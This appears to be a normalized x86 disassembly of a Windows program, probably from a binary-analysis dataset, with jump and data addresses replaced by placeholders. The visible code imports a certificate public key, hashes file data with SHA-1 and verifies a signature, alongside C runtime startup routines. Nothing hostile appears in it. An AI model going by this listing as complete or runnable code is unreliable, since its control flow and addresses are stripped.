lea edx [ ecx + ecx + 0x2 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
sub edx [ ecx + eax * 4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ecx + eax * 4 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
sub_410930
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
or eax 0xffffffff
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
pop ebp
retn
cmp [ ebp + 0x14 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0x1
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_412518
add esp 0x10
cmp eax 0x1
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x14 ]
push eax
call sub_411310
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp + 0x18 ]
push eax
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0xc
or eax 0xffffffff
jmp r-xdata
xor eax eax
mov ecx [ ebp + 0x18 ]
push ecx
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0xc
mov eax 0xfffffffe
jmp r-xdata
sub_4109f0
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
or eax 0xffffffff
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
lea ecx [ ebp - 0x10 ]
push ecx
call sub_411240
add esp 0x4
test eax eax
je r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
or eax 0xffffffff
jmp r-xdata
lea edx [ ebp - 0x8 ]
push edx
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp - 0x10 ]
push eax
call sub_4111a0
add esp 0x14
test eax eax
je r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp - 0x10 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push ecx
call sub_410b00
add esp 0xc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
push edx
call [ CryptDestroyKey@IAT ]
mov eax [ ebp - 0xc ]
push 0x1
mov eax [ ebp - 0x8 ]
push eax
call [ CertCloseStore@IAT ]
sub_410b00
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] 0x0
xor eax eax
mov [ ebp - 0x1f ] eax
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x2c ] 0xffffffff
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push 0x2
push 0x0
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4168aa
add esp 0x10
test eax eax
je r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
or eax 0xffffffff
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4167c4
add esp 0x4
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] edx
cmp [ ebp - 0x34 ] 0x0
jl r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x18 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
push 0x0
push 0x0
push 0x10
mov eax [ ebp + 0x8 ]
push eax
call sub_4168aa
add esp 0x10
test eax eax
je r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
push 0x1
push 0x4
lea edx [ ebp - 0x30 ]
push edx
call sub_412518
add esp 0x10
cmp eax 0x1
je r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
or eax 0xffffffff
jmp r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x38 ] 0x1f400000
jbe r-xdata
mov eax [ ebp - 0x30 ]
push eax
call [ Ordinal_WSOCK32_14@IAT ]
mov [ ebp - 0x30 ] eax
cmp [ ebp - 0x30 ] 0x8
jbe r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
push 0x8
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0xc
or eax 0xffffffff
jmp r-xdata
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x30 ]
jae r-xdata
cmp [ ebp - 0x14 ] 0x0
jbe r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
or eax 0xffffffff
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0x1
push 0x4
lea ecx [ ebp - 0xc ]
push ecx
call sub_412518
add esp 0x10
cmp eax 0x1
je r-xdata
mov edx [ ebp - 0xc ]
push edx
call [ Ordinal_WSOCK32_14@IAT ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
push eax
push 0x1
push 0x4
lea ecx [ ebp - 0x8 ]
push ecx
call sub_412518
add esp 0x10
cmp eax 0x1
je r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
or eax 0xffffffff
jmp r-xdata
mov edx [ ebp - 0x8 ]
push edx
call [ Ordinal_WSOCK32_14@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x800
jbe r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_412584
add esp 0x4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
push 0x1
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
call sub_412518
add esp 0x10
cmp eax 0x1
je r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
mov ecx [ ebp - 0x10 ]
push ecx
call sub_4121b5
add esp 0x4
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
push ecx
call sub_4121b5
add esp 0x4
mov edx [ ebp + 0x8 ]
push edx
call sub_4167c4
add esp 0x4
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x30 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_410e80
add esp 0x14
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x10 ]
push eax
call sub_4121b5
add esp 0x4
push 0x0
mov ecx [ ebp - 0x24 ]
push ecx
mov edx [ ebp - 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4168aa
add esp 0x10
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
jmp r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
or eax 0xffffffff
jmp r-xdata
jmp r-xdata
sub_410e80
push ebp
mov ebp esp
mov eax 0x1014
call sub_4137d0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_4112c0
add esp 0x8
push 0x0
push 0x0
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call sub_4168aa
add esp 0x10
test eax eax
je r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
push rw-data
lea eax [ ebp - 0xc ]
push eax
push 0x14
lea ecx [ ebp - 0x1010 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_410930
add esp 0x14
test eax eax
je r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0x14 ]
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_417227
add esp 0x4
test eax eax
jne r-xdata
push rw-data
lea edx [ ebp - 0xc ]
push edx
push 0x4
lea eax [ ebp - 0x1010 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_410930
add esp 0x14
test eax eax
je r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0x18 ]
push edx
lea eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0xc ]
push ecx
call sub_4110f0
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
push 0x1000
push 0x1
lea edx [ ebp - 0x1010 ]
push edx
call sub_412518
add esp 0x10
mov [ ebp - 0x1014 ] eax
mov eax [ ebp + 0x8 ]
push eax
call sub_41725b
add esp 0x4
test eax eax
je r-xdata
push rw-data
lea edx [ ebp - 0xc ]
push edx
push 0x4
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_410930
add esp 0x14
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x1014 ]
push ecx
lea edx [ ebp - 0x1010 ]
push edx
lea eax [ ebp - 0xc ]
push eax
call sub_411310
add esp 0xc
test eax eax
je r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
or eax 0xffffffff
jmp r-xdata
mov edx [ ebp - 0x8 ]
push edx
call [ Ordinal_WSOCK32_14@IAT ]
mov [ ebp - 0x8 ] eax
push 0x1
mov eax [ ebp - 0x8 ]
xor ecx ecx
push ecx
push eax
mov edx [ ebp + 0x8 ]
push edx
call sub_4168aa
add esp 0x10
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
jmp r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
or eax 0xffffffff
jmp r-xdata
jmp r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_4110f0
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0x1
jae r-xdata
mov eax [ ebp + 0x14 ]
push eax
call sub_412584
add esp 0x4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0x14 ]
jae r-xdata
push 0x0
push 0x0
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
push edx
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
call [ CryptVerifySignatureA@IAT ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0xc ]
push ecx
call sub_4121b5
add esp 0x4
mov eax [ ebp - 0x8 ]
neg eax
sbb eax eax
neg eax
sub eax 0x1
mov eax [ ebp + 0x14 ]
sub eax 0x1
sub eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
add ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x10 ]
mov al [ edx + eax ]
mov [ ecx ] al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
sub_4111a0
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp + 0x14 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
lea edx [ ebp - 0xc ]
push edx
push 0x0
mov eax [ ebp + 0x18 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x2
push 0x2
lea ecx [ ebp - 0x8 ]
push ecx
push 0x2
call [ CryptQueryObject@IAT ]
test eax eax
jne r-xdata
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0xc ]
add ecx 0x38
push ecx
push 0x10001
mov edx [ ebp + 0x8 ]
push edx
call [ CryptImportPublicKeyInfo@IAT ]
test eax eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0xc ]
push ecx
call [ CertFreeCertificateContext@IAT ]
xor eax eax
mov eax [ ebp - 0xc ]
push eax
call [ CertFreeCertificateContext@IAT ]
or eax 0xffffffff
jmp r-xdata
sub_411240
push ebp
mov ebp esp
push 0xf0000000
push 0x1
push rw-data
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call [ CryptAcquireContextA@IAT ]
test eax eax
jne r-xdata
xor eax eax
push 0xf0000008
push 0x1
push rw-data
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
call [ CryptAcquireContextA@IAT ]
test eax eax
jne r-xdata
push 0xf0000000
push 0x1
push 0x0
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call [ CryptAcquireContextA@IAT ]
test eax eax
jne r-xdata
push 0xf0000008
push 0x1
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call [ CryptAcquireContextA@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] 0x0
or eax 0xffffffff
jmp r-xdata
pop ebp
retn
sub_4112c0
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
mov [ eax ] 0x0
mov ecx [ ebp + 0xc ]
push ecx
push 0x0
push 0x0
push 0x8004
mov edx [ ebp + 0x8 ]
push edx
call [ CryptCreateHash@IAT ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
neg eax
sbb eax eax
neg eax
sub eax 0x1
sub_411310
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
call [ CryptHashData@IAT ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
neg eax
sbb eax eax
neg eax
sub eax 0x1
sub_4113a2
mov edi edi
push ebp
mov ebp esp
sub esp 0x44
push ebx
mov eax __dos_header
push esi
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
mov ebx [ esi + 0xc ]
add edx eax
push edi
mov edi [ esi + 0x14 ]
add edi eax
add ecx eax
mov [ ebp - 0x18 ] edx
mov edx [ esi + 0x10 ]
add ebx eax
add edx eax
mov eax [ esi + 0x1c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x38 ] ecx
xor ecx ecx
mov [ ebp - 0xc ] edi
mov [ ebp - 0x3c ] eax
xor eax eax
test [ esi ] 0x1
lea edi [ ebp - 0x30 ]
mov [ ebp - 0x44 ] 0x24
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x34 ] ecx
stosd [ edi ]
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
jne r-xdata
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
mov eax [ ebp + 0xc ]
sub eax ebx
sar eax 0x2
shl eax 0x2
add edx eax
mov edx [ edx ]
mov [ ebp + 0x8 ] eax
mov eax edx
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x34 ] eax
lea eax [ edx + r--data ]
jne r-xdata
lea eax [ ebp - 0x44 ]
mov [ ebp + 0xc ] eax
lea eax [ ebp + 0xc ]
push eax
push 0x1
push ecx
push 0xc06d0057
call [ RaiseException@IAT ]
xor eax eax
jmp r-xdata
mov [ ebp - 0x30 ] eax
mov eax [ rw-data ]
xor ebx ebx
cmp eax ecx
je r-xdata
movzx eax dx
pop edi
pop esi
pop ebx
leave
retn 0x8
test edi edi
jne r-xdata
lea edx [ ebp - 0x44 ]
push edx
push ecx
call eax
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x2c ] edi
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
test ebx ebx
jne r-xdata
lea ecx [ ebp - 0x44 ]
push ecx
push 0x2
call eax
mov ebx eax
push [ ebp - 0x38 ]
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
jne r-xdata
lea ecx [ ebp - 0x44 ]
push ecx
push 0x1
call eax
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp - 0x44 ]
push ecx
push 0x5
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x28 ] ebx
call eax
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
push edi
push [ ebp - 0x18 ]
call [ InterlockedExchange@IAT ]
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push [ ebp - 0x30 ]
push edi
call [ GetProcAddress@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ esi + 0x1c ] ebx
je r-xdata
push edi
call [ FreeLibrary@IAT ]
cmp [ esi + 0x18 ] 0x0
je r-xdata
lea eax [ ebp - 0x44 ]
mov [ ebp + 0xc ] eax
lea eax [ ebp + 0xc ]
push eax
push 0x1
push 0x0
push 0xc06d007e
call [ RaiseException@IAT ]
mov eax [ ebp - 0x28 ]
jmp r-xdata
lea ecx [ ebp - 0x44 ]
push ecx
push 0x3
call eax
mov edi eax
test edi edi
jne r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ edi + 0x3c ]
add eax edi
cmp [ eax ] 0x4550
jne r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
test eax eax
je r-xdata
test ebx ebx
jne r-xdata
lea ecx [ ebp - 0x44 ]
push ecx
push 0x4
call eax
mov ebx eax
mov ecx [ ebp - 0x4 ]
cmp [ eax + 0x8 ] ecx
jne r-xdata
mov [ eax + 0x4 ] esi
mov ecx [ rw-data ]
mov [ eax ] ecx
mov [ rw-data ] eax
jmp r-xdata
lea eax [ ebp - 0x44 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
push 0x1
push ebx
push 0xc06d007f
call [ RaiseException@IAT ]
mov ebx [ ebp - 0x28 ]
cmp edi [ eax + 0x34 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx + eax ]
test ebx ebx
jne r-xdata
sub_411639
push 0x14
push r--data
call sub_4183f0
mov eax 0x5a4d
cmp [ __dos_header ] ax
jne r-xdata
and [ ebp - 0x1c ] 0x0
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
call sub_418231
test eax eax
jne r-xdata
push 0x1c
call sub_411610
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_417d2a
and [ ebp - 0x4 ] 0x0
call sub_417ad6
test eax eax
jge r-xdata
push 0x10
call sub_411610
cmp [ eax + r--data ] 0xe
jbe r-xdata
call GetCommandLineW
mov [ rw-data ] eax
call sub_417a79
mov [ rw-data ] eax
call sub_4179cb
test eax eax
jge r-xdata
push 0x1b
call sub_416f1d
pop ecx
xor ecx ecx
cmp [ eax + __coff_header ] ecx
setne cl
mov [ ebp - 0x1c ] ecx
jmp r-xdata
call sub_41779c
test eax eax
jge r-xdata
push 0x8
call sub_416f1d
pop ecx
push 0x1
call sub_4183be
pop ecx
test eax eax
jne r-xdata
push 0x1
call sub_416fde
pop ecx
test eax eax
je r-xdata
push 0x9
call sub_416f1d
pop ecx
mov eax [ rw-data ]
mov [ rw-data ] eax
push eax
push [ rw-data ]
push [ rw-data ]
call sub_402f90
add esp 0xc
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push eax
call sub_416f1d
pop ecx
call sub_4171bb
jmp r-xdata
push eax
call sub_41718f
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_418435
retn
sub_411794
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
inc eax
inc eax
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_4117ae
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp [ ebx ] 0x0
push edi
mov edi eax
je r-xdata
pop edi
pop ebx
pop ebp
retn
movzx ecx [ eax ]
test cx cx
je r-xdata
xor eax eax
movzx edx cx
sub eax ebx
cmp [ ecx ] 0x0
je r-xdata
movzx edx [ ecx ]
test dx dx
je r-xdata
mov eax edi
jmp r-xdata
inc edi
inc edi
movzx edx [ edi ]
inc eax
inc eax
test dx dx
jne r-xdata
movzx ebx [ eax + ecx ]
movzx edx dx
sub ebx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test dx dx
je r-xdata
inc ecx
inc ecx
cmp [ eax + ecx ] bx
jne r-xdata
sub_41180f
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push [ rw-data ]
call sub_417df1
push [ rw-data ]
mov edi eax
mov [ ebp - 0x4 ] edi
call sub_417df1
mov esi eax
pop ecx
pop ecx
cmp esi edi
jb r-xdata
xor eax eax
mov ebx esi
sub ebx edi
lea eax [ ebx + 0x4 ]
cmp eax 0x4
jb r-xdata
push edi
call sub_4187a3
mov edi eax
lea eax [ ebx + 0x4 ]
pop ecx
cmp edi eax
jae r-xdata
push [ ebp + 0x8 ]
call sub_417d76
mov [ esi ] eax
add esi 0x4
push esi
call sub_417d76
pop ecx
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
pop ecx
jmp r-xdata
mov eax 0x800
cmp edi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax edi
cmp eax edi
jb r-xdata
mov eax edi
lea eax [ edi + 0x10 ]
cmp eax edi
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_418703
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_418703
pop ecx
pop ecx
test eax eax
je r-xdata
sar ebx 0x2
push eax
lea esi [ eax + ebx * 4 ]
call sub_417d76
pop ecx
mov [ rw-data ] eax
sub_4118c9
mov edi edi
push esi
push 0x4
push 0x20
call sub_4186b7
mov esi eax
push esi
call sub_417d76
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_4118fa
push 0xc
push r--data
call sub_4183f0
call sub_416f89
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_41180f
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_411930
mov eax [ ebp - 0x1c ]
call sub_418435
retn
sub_41194d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx eax
mov cx [ eax ]
inc eax
inc eax
test cx cx
jne r-xdata
mov cx [ ebp + 0xc ]
cmp [ eax ] cx
je r-xdata
cmp [ eax ] cx
jne r-xdata
pop ebp
retn
xor eax eax
dec eax
dec eax
cmp eax edx
je r-xdata
sub_411979
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_4119e1
mov edi edi
push ebp
mov ebp esp
push esi
call sub_4119ce
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_411979
pop ecx
mov esi eax
call sub_4119bb
mov [ eax ] esi
pop esi
pop ebp
retn
sub_411a04
mov edi edi
push esi
call sub_411794
pop ecx
cmp eax 0x5
jb r-xdata
xor eax eax
retn
movzx eax [ esi ]
cmp ax 0x5c
je r-xdata
movzx eax [ esi + 0x2 ]
cmp ax 0x5c
je r-xdata
cmp ax 0x2f
jne r-xdata
movzx eax [ esi + 0x4 ]
cmp ax 0x5c
je r-xdata
cmp ax 0x2f
jne r-xdata
cmp ax 0x2f
je r-xdata
lea eax [ esi + 0x6 ]
movzx ecx [ eax ]
xor edx edx
cmp cx dx
je r-xdata
cmp cx 0x5c
je r-xdata
cmp [ eax ] dx
je r-xdata
cmp cx 0x2f
je r-xdata
add eax 0x2
cmp [ eax ] dx
je r-xdata
inc eax
inc eax
movzx ecx [ eax ]
cmp cx dx
jne r-xdata
movzx ecx [ eax ]
cmp cx dx
je r-xdata
xor eax eax
inc eax
retn
cmp cx 0x5c
je r-xdata
cmp [ eax ] dx
je r-xdata
cmp cx 0x2f
je r-xdata
cmp [ eax + 0x2 ] dx
jne r-xdata
inc eax
inc eax
movzx ecx [ eax ]
cmp cx dx
jne r-xdata
sub_411aa5
mov edi edi
push ebp
mov ebp esp
push esi
push edi
call sub_4119bb
mov esi [ eax ]
call sub_4119bb
push [ ebp + 0x10 ]
and [ eax ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4189a3
add esp 0xc
mov edi eax
call sub_4119bb
test edi edi
je r-xdata
cmp [ eax ] 0x22
je r-xdata
mov [ eax ] esi
mov eax edi
jmp r-xdata
call sub_4119bb
push 0x0
push [ ebp + 0xc ]
mov [ eax ] esi
push 0x0
call sub_4189a3
mov ecx [ ebp + 0x14 ]
add esp 0xc
mov [ ecx ] eax
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_411b05
mov edi edi
push ebp
mov ebp esp
sub esp 0x47c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x474 ] esi
cmp esi ebx
jne r-xdata
